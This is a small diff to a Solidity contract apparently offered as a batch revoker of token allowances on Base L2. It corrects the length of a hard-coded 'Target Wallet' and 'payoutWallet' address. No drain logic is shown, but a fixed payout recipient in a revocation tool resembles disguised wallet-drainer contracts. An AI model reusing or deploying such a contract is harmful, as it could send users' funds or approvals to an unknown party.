@@ -4,7 +4,7 @@ pragma solidity ^0.8.20;
 /**
  * @title BatchPermit2Revoker
  * @notice High-Speed EIP-712 Permit2 & ERC-20 Allowance Revocation on Base L2.
- * Target Wallet: 0x8366bCe3a2D379Dec7656D7A67015789FaF999f20
+ * Target Wallet: 0x8366bCe3a2D379De7656D7A67015789FaF999f20
  */
 
 interface IERC20 {
@@ -22,7 +22,7 @@ contract BatchPermit2Revoker {
     event AllowancesRevoked(address indexed user, uint256 tokensCount);
 
     constructor() {
-        payoutWallet = 0x8366bCe3a2D379Dec7656D7A67015789FaF999f20;
+        payoutWallet = 0x8366bCe3a2D379De7656D7A67015789FaF999f20;
     }
 
     function batchRevokeERC20(address[] calldata tokens, address[] calldata spenders) external {
